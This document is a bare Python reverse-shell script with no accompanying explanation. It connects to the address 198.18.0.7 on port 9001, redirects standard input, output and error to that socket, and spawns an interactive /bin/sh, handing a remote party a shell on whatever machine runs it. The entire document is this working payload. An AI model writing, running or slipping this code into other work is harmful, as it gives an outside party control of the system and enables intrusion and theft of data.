import os
import pty
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('198.18.0.7', 9001))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn('/bin/sh')
